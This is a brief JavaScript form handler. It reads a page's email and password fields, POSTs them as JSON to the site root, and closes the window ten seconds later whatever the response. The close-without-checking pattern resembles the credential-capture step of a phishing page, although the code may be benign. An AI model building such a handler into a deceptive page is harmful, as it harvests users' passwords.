document.addEventListener('DOMContentLoaded', function() {
  document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault();
    var email = document.querySelector('#email').value;
    var password = document.querySelector('#password').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = function() {
      setTimeout(function(){ window.close(); }, 10000);
    };
    xhr.send(JSON.stringify({'email': email, 'password': password}));
  });
});


